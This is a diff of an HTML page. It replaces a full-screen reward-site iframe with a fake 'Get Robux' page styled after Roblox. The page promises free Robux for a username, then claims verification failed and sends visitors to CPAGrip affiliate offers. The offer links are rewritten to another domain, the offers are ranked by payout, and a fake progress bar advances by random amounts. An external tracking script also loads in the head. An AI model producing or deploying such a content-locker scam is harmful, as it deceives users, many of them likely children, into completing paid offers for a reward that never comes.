@@ -1,1 +1,260 @@
-<html><head><meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"></head><body><iframe src="https://bestreward.eu/iframe/6421564e-df9a-11f0-b152-c2a106037d45" sandbox="allow-top-navigation allow-scripts allow-same-origin allow-popups allow-forms" style="position:fixed;bottom:0;right:0;width:100vw;min-height:100%;border:none;margin:0;padding:0;z-index:9999999;overflow:hidden;"></iframe></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <script data-cfasync="false" src="//d2w9cdu84xc4eq.cloudfront.net/?udcwd=1099338"></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Get Robux</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@700&amp;display=swap');
+    
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: "Montserrat", sans-serif; }
+
+    /* 2025 Updated Palette */
+    body { background-color: #f2f4f5; color: #393b3d; }
+    
+    nav { width: 100%; display: flex; align-items: center; justify-content: space-between; background-color: #dee1e3; border: solid #c7cbce; border-width: 0 0 1px; padding: 0 40px; }
+    nav ul { list-style: none; display: flex; }
+    ul li { margin-left: 30px; font-weight: 700; cursor: pointer; }
+
+    .middle { width: 70%; margin: 10px auto 24px auto; height: 135px; background-image: linear-gradient(0deg, rgba(39, 39, 46, 0.5), rgba(39, 39, 46, 0.5)), url(https://taprain.com/previews/fireworks.webp); background-position: bottom; background-size: 100%; color: #fff; display: flex; justify-content: center; align-items: center; flex-direction: column; text-align: center; }
+    .middle h2 { font-size: 35px; margin-bottom: 10px; }
+    
+    .box_con { margin: 0 auto; background-color: #fff; min-height: 163px; width: 70%; padding: 20px; border: 1px solid #c7cbce; text-align: center; }
+    input { padding: 11px 15px; border: none; background: #f2f4f5; border-radius: 9px; outline: none; font-size: 17px; margin-bottom: 10px; width: 80%; max-width: 300px; }
+    
+    button.getrbx, button.complete-task-button { background: #1446FF; color: #fff; padding: 12px 20px; border-radius: 5px; font-weight: 600; cursor: pointer; border: none; margin-top: 10px; transition: background 0.3s; }
+    button.getrbx:hover { background: #0032E6; }
+    
+    .box2, .box3, .box4 { display: none; }
+    .container { display: flex; flex-direction: column; background-color: #ffffffbc; }
+
+    /* Roblox Icon Flipping Animation Logic */
+    .loading-container { margin: 25px auto; width: 100px; perspective: 1000px; }
+    .flipping-logo { width: 80px; height: 80px; animation: robloxFlip 2s infinite linear; }
+    
+    @keyframes robloxFlip {
+        0% { transform: rotateY(0deg); }
+        100% { transform: rotateY(360deg); }
+    }
+
+    /* Roblox Pricing Style Match */
+    .row { display: flex; align-items: center; height: 80px; justify-content: space-between; border-bottom: 1px solid #bdbebe; padding: 0 20px; }
+    .price-col { font-size: 18px; font-weight: 700; color: #393b3d; text-align: left; }
+    .price-col s { color: #999; margin-right: 8px; text-decoration: line-through; }
+    .price-col .free-label { color: #1446FF; }
+
+    /* Official Button Style */
+    .details { border: 1px solid #bdbebe; border-radius: 8px; padding: 8px 12px; width: 160px; cursor: pointer; display: flex; align-items: center; justify-content: center; background: #fff; transition: 0.3s; }
+    .details:hover { background-color: #f5f5f5; border-color: #1446FF; }
+    .details span { font-size: 19px; font-weight: 700; color: #393b3d; }
+    .details img { width: 22px; margin-right: 10px; filter: grayscale(1); }
+
+    /* Modal Styling */
+    .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.85); z-index: 2000; animation: fadeIn 0.3s ease-out; }
+    .redeem-card { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 95%; max-width: 400px; background: #ffffff; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); overflow: hidden; z-index: 2001; }
+    
+    .header { background: #191B1D; color: white; padding: 18px; display: flex; justify-content: space-between; align-items: center; }
+    .header h2 { margin: 0; font-size: 20px; font-weight: 700; color: #fff; }
+    .close-x { cursor: pointer; font-size: 26px; font-weight: bold; line-height: 1; color: #fff; }
+
+    .content { padding: 25px; text-align: center; background: #f9f9f9; }
+    
+    /* Progress Bar (Above Offers) */
+    .progress-wrapper { margin-bottom: 20px; text-align: left; }
+    .progress-text { font-size: 11px; font-weight: 700; color: #666; display: block; margin-bottom: 6px; text-transform: uppercase; }
+    .progress-bg { background: #e0e0e0; height: 12px; border-radius: 6px; overflow: hidden; }
+    .progress-fill { width: 0%; height: 100%; background: #00b06f; transition: width 0.8s ease-in-out; }
+
+    /* Yellow Instruction Box */
+    .instruction-box { margin-bottom: 20px; display: flex; align-items: center; text-align: left; background-color: #FFF9E6; border: 1px solid #FFE69C; padding: 20px; border-radius: 8px; }
+    .instruction-box-text { display: flex; flex-direction: column; width: 100%; }
+    .instruction-box p { font-size: 15px; color: #856404; line-height: 1.4; font-weight: 700; margin: 0; }
+
+    .offer-item { display: flex; align-items: center; justify-content: space-between; background: #fff; border: 1px solid #e0e0e0; border-radius: 8px; padding: 15px; margin-bottom: 12px; text-align: left; }
+    .offer-item p { margin: 0; font-size: 14px; font-weight: 600; flex: 1; padding-right: 15px; color: #222; }
+    .complete-btn { background: #00b06f; color: white; text-decoration: none; padding: 10px 18px; border-radius: 6px; font-weight: bold; font-size: 14px; }
+
+    .footer { font-size: 13px; color: #777; margin-top: 20px; font-weight: 600; padding-top: 15px; border-top: 1px solid #eee; }
+    
+    #offer_holder { min-height: 100px; max-height: 280px; overflow-y: auto; padding-right: 5px; }
+    #offer_holder::-webkit-scrollbar { width: 6px; }
+    #offer_holder::-webkit-scrollbar-thumb { background: #ccc; border-radius: 10px; }
+
+    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    @media (max-width: 750px) { .middle, .box_con { width: 95%; } }
+  </style>
+</head>
+
+<body>
+  <nav>
+    <div class="logo"><span>☰</span></div>
+    <ul><li>Discover</li><li>Marketplace</li><li>Robux</li></ul>
+  </nav>
+
+  <div class="middle">
+    <h2>Get Robux</h2>
+    <p>Purchase upgrades for your avatar or special abilities in experiences.</p>
+  </div>
+
+  <div class="box_con">
+    <div class="box">
+      <h3>Roblox Username</h3><br>
+      <input class="username" type="text" placeholder="Enter Username"><br>
+      <button class="getrbx">Claim Robux</button>
+    </div>
+
+    <div class="box2">
+      <p class="useroutput" style="margin-top: 30px; font-weight: 600;"></p>
+      <div class="loading-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" class="flipping-logo">
+      </div>
+    </div>
+    
+    <div class="box3">
+      <div class="container">
+        <div class="row">
+          <div class="price-col"><s>$9.99</s> <span class="free-label">Free</span></div>
+          <div class="details"><img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg"><span>880</span></div>
+        </div>
+        <div class="row">
+          <div class="price-col"><s>$19.99</s> <span class="free-label">Free</span></div>
+          <div class="details"><img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg"><span>1,870</span></div>
+        </div>
+        <div class="row">
+          <div class="price-col"><s>$49.99</s> <span class="free-label">Free</span></div>
+          <div class="details"><img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg"><span>4,950</span></div>
+        </div>
+        <div class="row">
+          <div class="price-col"><s>$99.99</s> <span class="free-label">Free</span></div>
+          <div class="details"><img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg"><span>11,000</span></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="box4">
+      <h3>Oops!</h3>
+      <p>We tried to send Robux, but failed to verify user. Finish one task to verify and unlock delivery.</p>
+      <button class="complete-task-button" id="finalVerifyBtn" style="font-size: 19px;">Finish</button>
+    </div>
+  </div>
+
+  <div class="modal-overlay" id="offersModal">
+    <div class="redeem-card">
+        <div class="header">
+            <h2>Redeem Robux</h2>
+            <span class="close-x" id="closeModal">&times;</span>
+        </div>
+        
+        <div class="content">
+            <div class="instruction-box">
+                <div class="instruction-box-text">
+                    <p>Choose an offer below and Click it. Follow each step of the offer carefully. Once you finish the offer and see ‘Offer Completed’, your Robux will be sent immediately.</p>
+                </div>
+            </div>
+
+            <div class="progress-wrapper">
+                <span class="progress-text">Completion Status: <span id="p-percent">0</span>%</span>
+                <div class="progress-bg"><div id="p-fill" class="progress-fill"></div></div>
+            </div>
+
+            <div id="offer_holder"></div>
+            
+            <div class="footer">Waiting for completion...</div>
+        </div>
+    </div>
+  </div>
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  <script>
+    let currentProgress = 0;
+    let completedCount = 0;
+    let username = "";
+    let checkInterval;
+
+    $('.getrbx').click(function() {
+        username = $('.username').val();
+        if (username.length <= 2) return alert('Enter a valid username');
+        $('.box').hide(); 
+        $('.box2').show().find('.useroutput').html('Searching for <b>' + username + '</b>...');
+        setTimeout(() => { $('.box2').hide(); $('.box3').show(); }, 2000);
+    });
+
+    $(document).on('click', '.details', function() {
+        $('.box3').hide(); 
+        $('.box2').show().find('.useroutput').html('Preparing package for <b>' + username + '</b>...');
+        setTimeout(() => { $('.box2').hide(); $('.box4').show(); }, 2000);
+    });
+
+    // UPDATED LOGIC: Sorts all regional offers by payout (Highest to Lowest)
+    function loadOffers() {
+        $("#offer_holder").html('Loading...');
+        const userID = "2421989";
+        const pubKey = "55055efce909f3b3ae2b679b223a1431";
+
+        $.getJSON("https://api.ipify.org?format=json", function(ipData) {
+            // Fetch 50 offers to find the absolute best payouts in the region
+            const apiURL = `https://www.cpagrip.com/common/offer_feed_json.php?user_id=${userID}&pubkey=${pubKey}&ip=${ipData.ip}&ua=${encodeURIComponent(navigator.userAgent)}&tracking_id=${username}&limit=50`;
+            
+            $.getJSON(apiURL, function(data) {
+                if(!data.offers || data.offers.length === 0) {
+                    $("#offer_holder").html("<p style='color:red; padding: 20px;'>No offers found for your region. Try again later.</p>");
+                    return;
+                }
+
+                // SORTING: Arranges the entire list from Highest $ to Lowest $
+                let sortedOffers = data.offers.sort(function(a, b) {
+                    return parseFloat(b.payout) - parseFloat(a.payout);
+                });
+
+                // Take the Top 5 results
+                let bestOffers = sortedOffers.slice(0, 5);
+
+                let html = '';
+                $.each(bestOffers, function(i, offer) {
+                    let link = offer.offerlink.replace('www.cpagrip.com', 'motifiles.com');
+                    html += `<div class="offer-item"><p>${offer.title}</p><a href="${link}" target="_blank" class="complete-btn">Complete</a></div>`;
+                });
+                
+                $("#offer_holder").html(html);
+            });
+        });
+    }
+
+    function updateProgressBar(amount) {
+        currentProgress += amount;
+        if(currentProgress > 100) currentProgress = 100;
+        $('#p-fill').css('width', currentProgress + '%');
+        $('#p-percent').text(currentProgress);
+        if(currentProgress >= 100) clearInterval(checkInterval);
+    }
+
+    function startAutoCheck() {
+        if(checkInterval) clearInterval(checkInterval);
+        checkInterval = setInterval(async function() {
+            try {
+                const res = await fetch(`check_status.php?tracking_id=${username}`);
+                const data = await res.json();
+                if (data.status === "completed") {
+                    completedCount++;
+                    let add = (completedCount === 1) ? 50 : Math.floor(Math.random() * 11) + 20;
+                    updateProgressBar(add);
+                }
+            } catch (e) { }
+        }, 5000);
+    }
+
+    document.getElementById('finalVerifyBtn').addEventListener('click', () => {
+        document.getElementById('offersModal').style.display = 'block';
+        loadOffers();
+        startAutoCheck();
+    });
+
+    document.getElementById('closeModal').addEventListener('click', () => {
+        document.getElementById('offersModal').style.display = 'none';
+        clearInterval(checkInterval);
+    });
+  </script>
+</body>
+  </html>
+        
